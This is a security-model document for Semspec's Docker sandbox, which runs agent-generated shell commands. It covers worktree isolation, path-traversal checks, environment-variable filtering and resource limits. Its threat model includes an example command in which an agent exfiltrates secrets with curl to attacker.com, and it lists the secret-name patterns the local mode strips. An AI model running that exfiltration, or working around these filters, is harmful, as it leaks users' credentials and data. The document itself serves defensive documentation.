# Sandbox Security Model

Semspec executes agent-generated shell commands. This document describes how the sandbox
contains that execution: what the boundaries are, what they protect against, and what they
deliberately do not restrict.

## Architecture Overview

The sandbox is a separate Docker container (`docker/sandbox.Dockerfile`) built on Ubuntu 24.04
with Go, Node.js, Java, Python, git, curl, and Gradle pre-installed. Semspec's `bash` tool
routes commands to it when `SANDBOX_URL` is set; without it, commands execute locally on the
host process.

```
semspec container          sandbox container
┌───────────────┐          ┌──────────────────────────────┐
│ bash tool     │─ POST ──▶│ POST /exec                   │
│               │  /exec   │   runs as: sandbox (non-root)│
│               │          │   cwd: .semspec/worktrees/   │
│               │          │         {taskID}/            │
└───────────────┘          │   env: 5 whitelisted vars    │
                           └──────────────────────────────┘
```

Each task gets its own git worktree at `.semspec/worktrees/{taskID}/` inside the mounted
repository volume. All file and command operations are scoped to that worktree. On task
completion, the worktree is merged into the target branch and deleted. Stale worktrees
(unmodified for 24 hours) are removed automatically by a cleanup loop.

## Security Boundary Table

| Concern | Mechanism | Location |
|---------|-----------|----------|
| Path traversal | `resolveTaskPath()`: `filepath.Clean` + `HasPrefix` with trailing separator | `cmd/sandbox/server.go` |
| Directory escape via task ID | Regex `^[a-zA-Z0-9._-]{1,256}$` rejects any other characters | `cmd/sandbox/server.go` |
| Directory escape via branch name | Regex + explicit rejection of `..` sequences and `.lock` suffix | `cmd/sandbox/server.go` |
| Absolute paths in file operations | `resolveTaskPath` rejects `filepath.IsAbs` paths | `cmd/sandbox/server.go` |
| Process isolation | `Setpgid: true`; timeout kill sends SIGKILL to entire process group | `cmd/sandbox/exec.go` |
| Output runaway | stdout and stderr each capped at 100 KB; excess silently discarded | `cmd/sandbox/exec.go` |
| Command timeout | Default 30s, maximum 5 minutes; configurable at startup | `cmd/sandbox/main.go` |
| File write size | Maximum 1 MB per write operation | `cmd/sandbox/main.go` |
| Env var leakage (sandbox) | Only 5 vars in subprocess env: `PATH`, `HOME`, `GOPATH`, `GOMODCACHE`, `NODE_PATH` | `cmd/sandbox/exec.go` |
| Env var leakage (local mode) | Filters by suffix (`_KEY`, `_SECRET`, `_TOKEN`, etc.), prefix (`AWS_`, `ANTHROPIC_`, etc.), and exact name | `tools/bash/executor.go` |
| SSRF via `http_request` tool | Blocks private/loopback/link-local IPs; pins resolved IP to prevent DNS rebinding | `tools/httptool/executor.go` |
| Container resource abuse | 2 CPUs, 2 GB memory, 256 max PIDs (E2E compose; configure in production) | `docker/compose/e2e.yml` |
| Concurrent repo mutation | `repoMu` mutex serializes merge/branch operations on the shared repo | `cmd/sandbox/server.go` |

## What Is Not Protected

**No API authentication.** The sandbox HTTP API on port 8090 has no authentication tokens or
request signing. Access control relies entirely on Docker network isolation — semspec reaches
the sandbox by name (`http://sandbox:8090`), and the port is not published to the host in
production. If you expose port 8090 to a network reachable by untrusted callers, any caller
can execute arbitrary commands in the container.

**No command blocklist.** Agents have unrestricted shell access inside the sandbox container.
There is no application-level filtering of commands like `rm -rf` or `curl`. The container
boundary is the security gate, not command inspection. This is intentional: a blocklist is
fragile, and the bash-first tool philosophy depends on agents having full shell access.

**No package version pinning.** `POST /install` runs `apt install`, `npm install`, `pip install`,
or `go get` without pinning versions. A compromised or yanked package in a public registry can
reach the container.

**Local mode has no filesystem restrictions.** When `SANDBOX_URL` is unset, commands execute
directly on the host process via `os/exec`. The env var filter reduces secret leakage, but
there is no chroot, no worktree scoping, and no resource limit. Local mode is appropriate for
development and CI environments where the host is already trusted.

**Production resource limits require explicit configuration.** The E2E compose file sets CPU,
memory, and PID limits on the sandbox service. The production `docker-compose.yml` does not
include these limits by default. Add `deploy.resources.limits` to your production compose
override if the host runs untrusted workloads.

## Environment Isolation

### Sandbox mode (recommended)

Commands executed via `POST /exec` receive exactly five environment variables, hardcoded in
`cmd/sandbox/exec.go`. No host environment leaks through:

```
PATH=/usr/local/go/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/go/bin
HOME=/home/sandbox
GOPATH=/go
GOMODCACHE=/go/pkg/mod
NODE_PATH=/usr/local/lib/node_modules
```

### Local mode (fallback)

Commands run via `os/exec` with a filtered copy of the host environment. Variables are
stripped when their name matches any of:

- **Suffixes**: `_KEY`, `_SECRET`, `_TOKEN`, `_PASSWORD`, `_CREDENTIAL`, `_CREDENTIALS`,
  `_AUTH`, `_API_KEY`, `_APIKEY`
- **Prefixes**: `AWS_`, `AZURE_`, `GCP_`, `GOOGLE_`, `GITHUB_TOKEN`, `OPENAI_`,
  `ANTHROPIC_`, `OPENROUTER_`
- **Exact names**: `BRAVE_SEARCH_API_KEY`, `DATABASE_URL`, `REDIS_URL`, `NATS_TOKEN`,
  `NATS_NKEY`, `SSH_AUTH_SOCK`, `GPG_AGENT_INFO`

The filter is best-effort. Variables not matching these patterns pass through. For complete
isolation, use sandbox mode.

## Resource Limits

The E2E compose configuration applies the following limits to the sandbox container:

| Resource | Limit |
|----------|-------|
| CPU | 2 cores |
| Memory | 2 GB |
| Max PIDs | 256 |

The PID limit prevents fork bombs. The memory limit prevents a single agent task from
exhausting host memory. These limits are not present in `docker-compose.yml`; add them to
your production compose override.

## Worktree Lifecycle

1. `POST /worktree` — creates a git worktree at `.semspec/worktrees/{taskID}/` on a new
   branch `agent/{taskID}`. Task IDs are validated against `^[a-zA-Z0-9._-]{1,256}$`.
2. Commands, file reads, and file writes execute inside that worktree.
3. On task approval: `POST /worktree/{taskID}/merge` — stages all changes, commits, and
   merges into the target branch via `--no-ff`.
4. On task rejection or error: `DELETE /worktree/{taskID}` — removes the worktree and
   deletes the branch.
5. Stale worktrees (mtime older than 24 hours) are removed automatically by `CleanupLoop`
   on a 1-hour interval.

## Bind-Mounted Repositories and UID/GID

Users bind-mount their local repository into the sandbox container:

```yaml
# docker-compose.yml
sandbox:
  volumes:
    - ${SEMSPEC_REPO:-.}:/repo
  build:
    args:
      SANDBOX_UID: ${SANDBOX_UID:-1000}
      SANDBOX_GID: ${SANDBOX_GID:-1000}
```

**The UID/GID problem:** The sandbox runs as user `sandbox`. If this user's UID doesn't match the
host user who owns the repo, files created inside the container will be owned by the wrong UID on
the host (and vice versa — the sandbox may not be able to write to host-owned files).

**Solution: Build-time UID injection.** The Dockerfile accepts `SANDBOX_UID` and `SANDBOX_GID`
build arguments. The `sandbox` user is created with these IDs, so files created inside the
container are owned by the host user. This is the same approach used by VSCode devcontainers and
Gitpod.

```bash
# Build with your host UID/GID (do this once, or add to .env)
SANDBOX_UID=$(id -u) SANDBOX_GID=$(id -g) docker compose build sandbox

# Or set in .env for persistent configuration
echo "SANDBOX_UID=$(id -u)" >> .env
echo "SANDBOX_GID=$(id -g)" >> .env
docker compose build sandbox
```

**Requirements for bind-mounted repos:**
- Must be a valid git repository (`.git/` must exist — sandbox validates at startup)
- Must have at least one commit (HEAD must be valid for worktree creation)
- Uncommitted changes are fine — worktrees branch from HEAD without touching the working tree

**What the sandbox writes to the repo:**
- `.semspec/worktrees/{taskID}/` — temporary, cleaned up after merge or 24h timeout
- `.semspec/worktrees/` directory itself — created at startup if missing
- Nothing else. User files outside `.semspec/worktrees/` are never modified by the sandbox.

## Threat Model

### Protected

- **Agent code reading host secrets**: sandbox mode provides a clean environment with no
  host env vars; local mode strips known secret patterns.
- **Path traversal to files outside the worktree**: `resolveTaskPath` blocks escape via
  `../` sequences at the API layer.
- **Runaway processes**: process group kill on timeout; PID limit prevents fork bombs.
- **Runaway output**: per-stream 100 KB cap prevents memory exhaustion from verbose commands.
- **SSRF from `http_request` tool**: private IP blocking with DNS rebinding protection.
- **Concurrent git corruption**: mutex serializes all operations that mutate the main repo.

### Not protected

- **Malicious code that exfiltrates data via allowed network paths**: the container has
  outbound internet access for package installation and test dependencies. An agent that
  calls `curl https://attacker.com/exfil?data=$(cat /repo/secrets)` will succeed if those
  files exist and are readable.
- **Supply chain attacks via package installation**: packages fetched at runtime are not
  pinned or verified beyond the registry's own checksums.
- **Lateral movement to other Docker services**: the container shares the internal Docker
  network with NATS, semspec, and semsource. A compromised agent can attempt connections
  to those services. NATS auth (if configured) provides a second layer; semspec's NATS
  client does not expose arbitrary subjects to agents.
- **Host escape via container vulnerabilities**: the `sandbox` user is non-root, which
  reduces the impact of container escape bugs, but is not a guarantee.
